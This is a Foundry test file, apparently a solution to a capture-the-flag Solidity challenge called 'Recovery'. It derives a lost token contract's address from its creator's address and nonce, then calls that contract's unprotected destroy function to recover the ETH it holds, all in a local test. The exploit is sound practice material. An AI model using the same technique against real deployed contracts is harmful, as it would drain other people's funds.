// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract PreservationTest is Test {
    Recovery public recovery;
    address payable firstToken;

    address alice = address(1);

    function calculateAddr(address sender, uint256 nonce) public pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, uint8(nonce))))));
    }

    function setUp() public {
        recovery = new Recovery();
        deal(alice, 0.001 ether);

        vm.prank(alice);
        recovery.generateToken("firstToken", 10 ether);
        firstToken = payable(calculateAddr(address(recovery), 1));

        vm.prank(alice);
        (bool ok,) = firstToken.call{value: 0.001 ether}("");
        require(ok, "send ETH failed");
    }

    function testAttack() public {
        assertEq(firstToken.balance, 0.001 ether);
        assertEq(alice.balance, 0);

        SimpleToken(firstToken).destroy(payable(alice));
        assertEq(alice.balance, 0.001 ether);
    }
}
